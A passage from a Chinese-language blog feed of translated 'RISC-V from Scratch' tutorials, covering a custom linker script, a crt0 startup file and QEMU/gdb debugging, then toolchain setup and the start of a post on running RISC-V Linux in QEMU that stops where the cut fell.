<code>crt0</code> 需要知道栈顶的起始位置，以进行初始化。虽然不是很推荐，但简便起见，我们在 <code>crt0</code> 中将此值硬编码为 <code>0x80000000</code>。这可能会引起不便，例如，当我们想使用具有不同内存属性的其他经过 <code>qemu</code> 化的 CPU（例如 <code>sifive_e</code> ）时会发生什么？</p><p>好在这个问题还很遥远，且存在一个很好的解决方案。 GNU 的链接程序 <code>ld</code> 为我们提供了<a href="https://web.archive.org/web/20190525173911/https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Using_ld_the_GNU_Linker/assignments.html">一种定义可以从 <code>crt0</code> 访问的符号的方法</a>。除了 <code>ld</code> 提供的外，我们还可以使用它来创建 <code>__stack_top</code> 符号，它在多个不同的 CPU 之间具有相当的灵活性。</p><p>与其从头开始编写我们自己的链接器，不如将 <code>ld</code> 使用的默认链接器脚本稍加修改，增加我们想要的符号。你可能想知道什么是链接描述文件？<a href="http://www.scoberlin.de/content/media/http/informatik/gcc_docs/ld_3.html">此文</a>总结甚好：</p><blockquote><p><em>The main purpose of the linker script is to describe how the sections in the input files should be mapped into the output file, and to control the memory layout of the output file.</em></p></blockquote><p>清楚了不？现在我们开始将默认的链接器脚本拷贝下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">In the `riscv-from-scratch/work` directory...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Copy the default linker script into riscv64-virt.ld</span><br>riscv64-unknown-elf-ld --verbose &gt; riscv64-virt.ld<br></code></pre></td></tr></table></figure><p>文件里有很多有意思的信息，包括 <code>ld</code> 的版本号，可支持的架构等，当然这些东西的存在与否，完全不影响脚本的正常工作，可以将等于号之前的东西全部删掉的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim riscv64-virt.ld<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Remove everything above and including the ============ line</span><br>GNU ld (GNU Binutils) 2.32<br>  Supported emulations:<br>   elf64lriscv<br>   elf32lriscv<br>using internal linker script:<br>==================================================<br>/* Script for -z combreloc: combine and sort reloc sections */<br>/* Copyright (C) 2014-2019 Free Software Foundation, Inc.<br>   Copying and distribution of this script, with or without modification,<br>   are permitted in any medium without royalty provided the copyright<br>   notice and this notice are preserved.  */<br>OUTPUT_FORMAT(&quot;elf64-littleriscv&quot;, &quot;elf64-littleriscv&quot;,<br>      &quot;elf64-littleriscv&quot;)<br>...rest of the linker script...<br></code></pre></td></tr></table></figure><p>之后，我们要做的第一件事，就是用 MEMORY 命令告诉 <code>ld</code> 我们要手动控制内存布局。这为我们能够正确定义 <code>__stack_top</code> 的位置铺平了道路。然后，找到以 <code>OUTPUT_ARCH (riscv) </code>开头的行，该行应位于文件顶部，并在其下面添加我们的 MEMORY 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">OUTPUT_ARCH(riscv)<br>/* &gt;&gt;&gt; Our addition. &lt;&lt;&lt; */<br>MEMORY<br>&#123;<br>   /* qemu-system-risc64 virt machine */<br>   RAM (rwx)  : ORIGIN = 0x80000000, LENGTH = 128M <br>&#125;<br>/* &gt;&gt;&gt; End of our addition. &lt;&lt;&lt; */<br>ENTRY(_start)<br></code></pre></td></tr></table></figure><p>这样，我们就创建了一个叫 RAM 的 memory，权限是 rwx，可读可写可执行。</p><p>好的，这样一来，我们定义的内存布局就和 <code>virt</code>机器完全一致了。但除非我们接着做什么，否则空空一个 RAM 也完全没有用。我们要把自己的堆栈建在 RAM 里面，这就需要定义 <code>__stack_top</code> 。</p><p>这也很简单，打开 <code>riscv64-virt.ld</code> ，按照以下做即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">SECTIONS<br>&#123;<br>  /* Read-only sections, merged into text segment: */<br>  PROVIDE (__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x10000));<br>  . = SEGMENT_START(&quot;text-segment&quot;, 0x10000) + SIZEOF_HEADERS;<br>  /* &gt;&gt;&gt; Our addition. &lt;&lt;&lt; */<br>  PROVIDE(__stack_top = ORIGIN(RAM) + LENGTH(RAM));<br>  /* &gt;&gt;&gt; End of our addition. &lt;&lt;&lt; */<br>  .interp         : &#123; *(.interp) &#125;<br>  .note.gnu.build-id  : &#123; *(.note.gnu.build-id) &#125;<br></code></pre></td></tr></table></figure><p>可以看到，我们使用 <a href="https://web.archive.org/web/20190525173911/https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Using_ld_the_GNU_Linker/assignments.html#PROVIDE">PROVIDE 命令</a>，定义了符号 <code>__stack_top</code>，它可被任何链接了该脚本的程序访问到，<code>__stack_top</code>的值是 <code>ORIGIN(RAM)</code> ，即 <code>0x80000000</code> 加上 <code>0x8000000</code>，其位置是 <code>0x88000000</code></p><h2 id="前方高能-运行时">前方高能 运行时</h2><p>终于，我们快要完成了。创建一个文件 <code>crt0.s</code> ，然后加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.section .init, &quot;ax&quot;<br>.global _start<br>_start:<br>    .cfi_startproc<br>    .cfi_undefined ra<br>    .option push<br>    .option norelax<br>    la gp, __global_pointer$<br>    .option pop<br>    la sp, __stack_top<br>    add s0, sp, zero<br>    jal zero, main<br>    .cfi_endproc<br>.end<br></code></pre></td></tr></table></figure><p>值得注意的是，有很多以 . 开头的行。这是一个汇编文件，这是因为，阅读文件的程序是汇编器，在GNU 中它是 <code>as</code> 文件。以 <code>.s</code> 开头的行是伪指令，伪指令向汇编程序提供信息，而不是像 RISC-V 汇编指令（例如 <code>jal</code> 和 <code>add</code>）那样成为可执行代码。</p><p>鉴于汇编语言不是很好读懂，我接下来会给大家一一讲解这程序在干嘛。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.section .init, &quot;ax&quot;<br></code></pre></td></tr></table></figure><p>参考 <a href="https://ftp.gnu.org/old-gnu/Manuals/gas-2.9.1/html_chapter/as_7.html">GNU as manual</a> 该行旨在告诉编译器接下来的代码会要进入名为 <code>.init</code> 的 section ，且权限是 <code>a</code>llocatable and e<code>x</code>ecutable 。<code>.init</code> section 也是<a href="https://web.archive.org/web/20190104080351/http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html">通常遵循的惯例</a> ，用于在操作系统内运行代码。可笑的是我们现在还没操作系统（那是因为我们正在写），关于 <code>.init</code> section ，这个解释更佳：</p><blockquote><p>This section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called <em>main</em> in C programs).</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.global _start<br>_start:<br></code></pre></td></tr></table></figure><p><code>.global</code> 是必须的，这是要让 <code>ld</code> 能看见这个定义的符号，在链接时，<code>ld</code> 会根据链接器脚本<code>ENTRY(_start)</code> 寻找 <code>_start</code> ，找到程序开始执行的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nasm">_start:<br>  .cfi_startproc<br>  .cfi_undefined ra<br>  ...other stuff...<br>  .cfi_endproc<br></code></pre></td></tr></table></figure><p>这些 <code>.cfi</code> 指令会把 frame 结构以及如何展开等信息通知给汇编器、异常展开器等工具。<code>.cfi_startproc</code> 和 <code>.cfi_endproc</code> 指示了该函数的开始与结束。<code>.cfi_undefined ra</code> 告诉<a href="https://sourceware.org/binutils/docs/as/CFI-directives.html">编译器寄存器 <code>ra</code> 不应当被恢复为以前的值</a> 。因为 <code>ra</code> 内含的通常是返回地址，其值在第一个开始执行的函数 <code>_start</code> 前是不确定的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.option push<br>.option norelax<br>la gp, __global_pointer$<br>.option pop<br></code></pre></td></tr></table></figure><p>这些 <code>.option</code> 指令可内联汇编代码来修改汇编程序，这在必须使用一组特定的选项汇编指令序列时非常有用。该<a href="https://embarc.org/man-pages/as/RISC_002dV_002dDirectives.html">链接</a>详细说明了为什么这对上面的代码段很重要，因此我将直接引用它（事实上原博主直接抄的那个手册<code>:)</code>）：</p><blockquote><p><em>…since we relax addressing sequences to shorter GP-relative sequences when possible, the initial load of GP must not be relaxed and should be emitted as something like:</em></p></blockquote><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.option push<br>.option norelax<br>la gp, __global_pointer$<br>.option pop<br></code></pre></td></tr></table></figure><p><em>in order to produce, after linker relaxation, the expected:</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">auipc gp, %pcrel_hi(__global_pointer$)<br>addi gp, gp, %pcrel_lo(__global_pointer$)<br></code></pre></td></tr></table></figure><p><em>instead of just:</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">addi gp, gp, 0<br></code></pre></td></tr></table></figure></blockquote><p>最后，看一下这部分代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nasm">_start:<br>  ...other stuff...<br>  la sp, __stack_top<br>  add s0, sp, zero<br>  jal zero, main<br>  .cfi_endproc<br>  .end<br></code></pre></td></tr></table></figure><p>这里我们终于用到了 <code>__stack_top</code> 符号，<code>la</code> 是 RISC-V 的伪汇编指令，意为 “load address” ，它获取 <code>__stack_top</code> 定义的地址数据，传递给 <code>sp</code> (stack pointer) 寄存器，这样一来后面的程序就可以使用这个栈了。</p><p>接下来，<code>add s0, sp, zero</code> 就是将 <code>sp</code> 的值加 0 后存入 <code>s0</code> ，<code>s0</code> 在某些方面是一个特殊的寄存器。首先，它是所谓的“保存寄存器”，这意味着它的值可以在函数调用之间保留。其次，<code>s0</code> 有时用作帧指针(frame pointer)，这使每个函数调用都可以在堆栈上有自己的空间，用于存储传递该函数的参数。函数调用、堆栈指针和帧指针等是一个非常有趣的话题，但是目前，仅知道初始化帧指针 <code>s0</code> 是我们运行时的重要任务就可以了。</p><p>下一句 <code>jal zero main</code> ，<code>jal </code>是 “jump and link” 的缩写，其意思是无条件跳转到 <code>main</code> 符号点。由于 zero 的寄存器 <code>x0</code> 恒为0，因此该语句除了无条件跳转外无副作用。初次接触 RISC-V 的读者可能会觉得奇怪，为何使用 zero 寄存器作为目标寄存器，来实现一个无条件且无副作用的跳转。为什么要这样做呢……就不能额外加一个明确的无条件跳转指令？</p><p>实际上，这是一种巧妙的优化。每多支持一个的指令就意味着更大、更昂贵的处理器，因此 ISA 越简单越好。因而 RISC-V ISA 并不同时支持 <code>jal</code> 和无条件跳转指令，而是仅要求 <code>jal</code>，但通过 <code>jal zero main</code> 来支持无条件跳转。</p><p>RISC-V 中有许多类似的优化，其中大多数采用的是伪指令的形式。伪指令是汇编器知道如何转换为其他实际的硬件实现的指令的指令。例如，有一个无条件跳转伪指令 <code>j offset_address</code>，RISC-V 汇编程序将其转换为 <code>jal zero，offset_address</code>。有关正式支持的伪指令的完整列表，请在 <a href="https://content.riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf">RISC-V规范的v2.2</a>查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nasm">_start:<br>  ...other stuff...<br>  jal zero, main<br>  .cfi_endproc<br>  .end<br></code></pre></td></tr></table></figure><p>最后一行，仍是一个汇编器指令，<code>.end</code> 指示了程序文件的结束。</p><h2 id="真正开始调试">真正开始调试</h2><p>在开始前，回顾一下迄今我们做了什么，我们首先使用 <code>qemu</code> 和 <code>dtc</code> 找到了在 <code>virt</code> 虚拟机中的内存信息，然后使用这些信息，我们开始通过修改 <code>riscv64-unknown-elf-ld</code> 的链接器脚本，来”手动“控制内存的布局，最后，我们通过使用自定义的符号创建了一个自己的 <code>crt0.S</code> 文件，创建了栈和全局指针，并最后调用了 <code>main</code> 函数，好接下来，我们一鼓作气，开始真正的调试工作。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-gcc -g -ffreestanding -O0 -Wl,--gc-sections \<br>    -nostartfiles -nostdlib -nodefaultlibs -Wl,-T,riscv64-virt.ld \<br>    crt0.s add.c<br></code></pre></td></tr></table></figure><p>使用 gcc 编译、链接。不过这边突然多了一大堆的选项，令人头秃。</p><p><code>-ffreestanding</code> <a href="https://stackoverflow.com/questions/17692428/what-is-ffreestanding-option-in-gcc#17692510">告诉编译器标准库可能不存在</a>，因此不能做任何假设。在主机环境中运行应用程序时，此选项不是必需的，但是我们没有这样做，因为重要的是告诉编译器该信息。</p><p><code>-Wl</code> 是逗号分隔的标志列表，以传递给链接器 <code>ld</code>。 <code>--gc-sections</code> 代表“垃圾收集 section”，告诉<code>ld</code> 在链接后删除未使用的节。 <code>-nostartfiles</code>，<code>-nostdlib</code> 和 <code>-nodefaultlibs</code> 分别告诉链接器不要链接任何标准系统启动文件（例如默认 <code>crt0</code>），任何标准系统 stdlib 实现或任何标准系统默认可链接库。我们提供了自己的 <code>crt0</code> 和链接描述文件，因此传递这些标志以告知编译器，我们不希望使用这些默认设置中的任何一个。</p><p><code>-T</code> 允许你将你的链接器脚本路径传给链接器，在我们这次实验中就是 <code>riscv64-virt.ld</code> 。最后，加上我们想要编译的文件 <code>crt0.s</code>和 <code>add.c</code> 。然后，我们得到了 <code>a.out</code> ，再使用 <code>qemu</code> 开启虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">-S freezes execution of our executable (-kernel) <span class="hljs-keyword">until</span> we explicitly tell</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">it to start with a <span class="hljs-string">&#x27;continue&#x27;</span> or <span class="hljs-string">&#x27;c&#x27;</span> from our gdb client</span><br>qemu-system-riscv64 -machine virt -m 128M -gdb tcp::1234 -S -kernel a.out<br></code></pre></td></tr></table></figure><p>再另开一个终端，打开 <code>gdb</code> ，装载入 <code>a.out</code> 的符号表，并链接目标机器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-gdb --tui a.out<br><br>GNU gdb (GDB) 8.2.90.20190228-git<br>Copyright (C) 2019 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;--host=x86_64-apple-darwin17.7.0 --target=riscv64-unknown-elf&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...<br>Reading symbols from a.out...<br>(gdb)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) target remote :1234                                                                             │<br>Remote debugging using :1234<br></code></pre></td></tr></table></figure><p>设置断点并运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) b main<br>Breakpoint 1 at 0x8000001e: file add.c, line 2.<br><br>(gdb) c<br>Continuing.<br><br>Breakpoint 1, main () at add.c:2<br></code></pre></td></tr></table></figure><p>啊哈，你会注意到程序真的在你的断点处停下来了，并且 GDB 内部还有很多相关的地址、数据信息，要是想查看寄存器值，使用命令 <code>info all-registers</code> 就可以了：</p><p><img src="https://twilco.github.io/img/working_gdb.png" alt=""></p><h2 id="接下来">接下来</h2><p>在我们的下一篇文章中，我们将通过在<code>virt</code> QEMU 机器上开始实现 <code>UART</code> 的驱动程序，继续在 RISC-V组装上积累知识。期望了解 UART 是什么以及它如何工作，其他设备树(device tree)属性，实现与NS16550A 兼容的 UART 驱动程序所需的基本构造块等。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 1</title>
    <link href="/2020/07/24/2020-7-24-riscv-from-scratch-1/"/>
    <url>/2020/07/24/2020-7-24-riscv-from-scratch-1/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from Scratch 1</h1><p>译自：<a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html">RISC-V from scratch 1: Introduction, toolchain setup, and hello world!</a></p><p>最近在尝试完成一个 RISC-V 内核，在搜索资料的时不经感叹 RISC-V 的中文相关内容少且不精，而当我读完这系列英文博客后感觉受益匪浅，故将其翻译为中文，既方便接下来的研究，也方便更多朋友学习。<a href="https://github.com/twilco/riscv-from-scratch">这是</a>系列 github 库。</p><h2 id="简介">简介</h2><p>通过 <em>RISC-V from scratch</em>，我会给你介绍一些很多与 RISC-V 及其生态相关的底层概念（例如编译、链接、原语运行时、汇编等）。</p><p>在第一篇博文中，我将简短的讨论一下 RISC-V 以及为什么它很重要，并搭建起 RISC-V 的工具链，最后在 RISC-V 模拟器中构建并运行一个简单的 C 程序。</p><h2 id="什么是-RISC-V">什么是 RISC-V</h2><p>RISC-V 是一个开源免费的 ISA，始于2010年在 UC-Berkeley 的一个项目。不得不承认，免费使用对其成功起到了重要作用，也使之与其他体系结构形成了鲜明的对比。以 ARM 为例——为创作一个兼容 ARM 的处理器，你必须支付<a href="https://www.anandtech.com/show/7112/the-arm-diaries-part-1-how-arms-business-model-works/2">100万美元至1000万美元的前期费用，以及每片0.5％-2％的特许权使用费</a>。这种免费、开放的模型使 RISC-V 对许多人来说都是有吸引力的，这是因为很多硬件初创公司无力负担许可处理器，以及学术机构、开源社区的费用。</p><p>RISC-V 的迅速崛起在当时并没有引起人们的注意。ARM 推出了一个现在被淘汰的网站，该网站试图（但没有成功）强调 ARM 相对于 RISC-V 的假定优势。现如今 RISC-V 得到了包括 Google，Nvidia 和Western Digital 在内的众多主要公司的支持。</p><h2 id="QEMU-and-RISC-V-toolchain-setup">QEMU and RISC-V toolchain setup</h2><p>除非我们有一个适合的环境，否则我们肯定无法在 RISC-V 处理器上跑任何代码。当然，在 <a href="https://www.qemu.org/">qemu</a> 的帮助下，我们也不需要真的买一个 RISC-V 的处理器来完成这个实验。在 Mac 下，安装 <code>qemu</code>是非常简单的（其余操作系统看<a href="https://www.qemu.org/download">这里</a>)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qemu<br></code></pre></td></tr></table></figure><p>我们刚刚安装的<code>qemu</code> 内有若干台的机器（可通过 <code>qemu-system-riscv32 -machine </code>选项指定），这非常方便。</p><p>接下来，让我们安装 <a href="http://openocd.org/">OpenOCD</a> 的 RISC-V 兼容副本和 RISC-V 工具链。</p><ol><li><p>从此处下载 RISC-V OpenOCD 和 RISC-V 工具链的预构建版本：</p></li><li><p>将这些文件移动并解压缩到某个目录中。我为这个和其他 RISC-V 工具链 QEMU 等创建一个名为<code>~/usys/riscv</code> 的文件夹。请记住你选择的目录，因为我们将在本文和下一篇文章中使用它。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p ~/usys/riscv<br>cd ~/Downloads<br>cp openocd-&lt;date&gt;-&lt;platform&gt;.tar.gz ~/usys/riscv<br>cp riscv64-unknown-elf-gcc-&lt;date&gt;-&lt;platform&gt;.tar.gz ~/usys/riscv<br>cd ~/usys/riscv<br>tar -xvf openocd-&lt;date&gt;-&lt;platform&gt;.tar.gz<br>tar -xvf riscv64-unknown-elf-gcc-&lt;date&gt;-&lt;platform&gt;.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>设置环境变量：<code>RSICV_OPENOCD_PATH</code> 和 <code>RISCV_PATH</code> ，方便其他程序找到我们的工具链。在不同操作系统下，该操作会明显不同，在 Mac 上，可以这样做：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">I put these two exports directly <span class="hljs-keyword">in</span> my ~/.zshenv file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">If you use a different shell or OS you may have to <span class="hljs-keyword">do</span> something <span class="hljs-keyword">else</span>.</span><br>export RISCV_OPENOCD_PATH=&quot;$HOME/usys/riscv/openocd-&lt;date&gt;-&lt;version&gt;&quot;<br>export RISCV_PATH=&quot;$HOME/usys/riscv/riscv64-unknown-elf-gcc-&lt;date&gt;-&lt;version&gt;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Reload .zshenv with our new environment variables.</span>  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">Restarting your shell will have a similar effect.</span><br>source ~/.zshenv<br></code></pre></td></tr></table></figure></li><li><p>接下来，我们要给这些可执行文件创建一个软链接到 <code>/usr/local/bin</code> ，这样我们就可以不必每次都把完整的路径打出来了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Symbolically <span class="hljs-built_in">link</span> our gcc executable into /usr/local/bin.</span>  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">Repeat this process <span class="hljs-keyword">for</span> any other executables you want to quickly access.</span><br>ln -s ~/usys/riscv/riscv64-unknown-elf-gcc-8.2.0-&lt;date&gt;-&lt;version&gt;/bin/riscv64-unknown-elf-gcc /usr/local/bin<br></code></pre></td></tr></table></figure></li></ol><p>好啦，我们已经装好了 RISC-V 工具链。这些可执行文件（例如 <code>riscv64-unknown-elf-gcc</code>, <code>riscv64-unknown-elf-gdb</code>, <code>riscv64-unknown-elf-ld</code> 等都放在 <code>~/usys/riscv/riscv64-unknown-elf-gcc-&lt;date&gt;-&lt;version&gt;/bin/</code>。</p><h2 id="Hello-RISC-V">Hello, RISC-V!</h2><p><strong>于2019年5月26日更新</strong></p><p>很不幸的是，因为 RISC-V QEMU 出现了一个 bug ，导致在 QEMU 上运行 <a href="https://github.com/sifive/freedom-e-sdk">freedom-e-sdk</a> “hello world” 程序无法跑通。补丁已经加上，但接下来的部分你们是无法跑通的，不过，你不必担心，因为接下来的部分可以跳过，不会影响后续的实验结果。</p><p>更多信息，请看这里: <a href="https://github.com/sifive/freedom-e-sdk/issues/260#issuecomment-496037827">https://github.com/sifive/freedom-e-sdk/issues/260#issuecomment-496037827</a></p><hr><p>现在我们已经有了工具链，让我们运行一个示例 RISC-V 程序。之前，我链接了一个名为 <a href="https://github.com/sifive/freedom-e-sdk">freedom-e-sdk</a> 的 SiFive 库，该库提供了我们可以尝试的各种程序。首先以递归方式 clone 此库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/wherever/you/want/to/clone/this<br>git clone --recursive https://github.com/sifive/freedom-e-sdk.git<br>cd freedom-e-sdk<br></code></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/a/12785204">传统技能</a>，运行一个 freedom-e-sdk 提供的 hello world 程序吧！首先，使用 <code>Makefile</code>来编译他们提供的程序，并指定编译后的目标。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make PROGRAM=hello TARGET=sifive-hifive1 CONFIGURATION=debug software<br></code></pre></td></tr></table></figure><p>然后，在 QEMU 上运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-riscv32 -nographic -machine sifive_e -kernel software/hello/debug/hello.elf<br>Hello, World!<br></code></pre></td></tr></table></figure><h2 id="下一步">下一步</h2><p>这是一个很好的开始，但是我的目标是 <a href="https://seths.blog/2005/03/dont_shave_that/">shave the yak</a>，尽管已经确认我们有一个行之有效的工具链，但<code>freedom-e-sdk</code> 示例却隐藏了很多有趣的细节。请注意，我们不必设置任何链接器文件或启动代码——SiFive 提供板级支持的链接器脚本，各种<code>Makefile</code>和 <a href="https://github.com/sifive/freedom-metal">freedom-metal library</a> 为我们解决这些问题。</p><p>在本系列的第二部分中，我们将摆脱<code>freedom-e-sdk</code>的束缚，走自己的路。我们将使用<code>dtc</code>检查 <code>qemu </code>虚拟机的硬件布局，设计并检查链接器脚本，创建基本运行时以设置我们的堆栈，了解一些基本的 RISC-V 装配，等等。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QEMU 上运行 RISC-V Linux 内核</title>
    <link href="/2020/07/23/2020-7-23-RISC-V_on_QEMU/"/>
    <url>/2020/07/23/2020-7-23-RISC-V_on_QEMU/</url>
    
    <content type="html"><![CDATA[<h1>QEMU 上运行 RISC-V Linux 内核</h1><p>最近这段时间我在研究 RISC-V 内核。作为计划的开始，首先要将它运行起来。配置过程有点复杂，在此做详细介绍。</p><h2 id="准备">准备</h2><ul><li>操作系统 Ubuntu 18.04</li><li><a href="https://github.com/riscv/riscv-gnu-toolchain">RISC-V GNU 工具链</a></li><li><a href="https://github.com/qemu/qemu">QEMU</a></li><li><a href="https://www.kernel.org/">Linux</a></li><li><a href="https://github.com/riscv/riscv-pk">Berkeley Boot Loader</a></li><li><a href="https://github.com/michaeljclark/busybear-linux">Busybear Linux</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone --recursive https://github.com/riscv/riscv-gnu-toolchain<br>git clone https://github.com/qemu/qemu<br>git clone https://github.com/torvalds/linux<br>git clone https://github.com/riscv/riscv-pk<br>git clone https://github.com/michaeljclark/busybear-linux<br></code></pre></td></tr></table></figure><p>顺带一提，为了构建过程顺利，请先试着安装以下依赖：</p><figure class="highlight shell"><table><tr><td 